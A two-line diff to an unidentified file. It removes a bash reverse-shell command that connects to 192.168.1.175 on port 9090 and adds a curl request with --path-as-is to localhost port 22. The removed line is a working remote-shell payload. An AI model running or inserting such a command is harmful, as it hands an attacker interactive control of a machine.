@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/192.168.1.175/9090 0>&1
+curl -v --path-as-is https://127.0.0.1:22
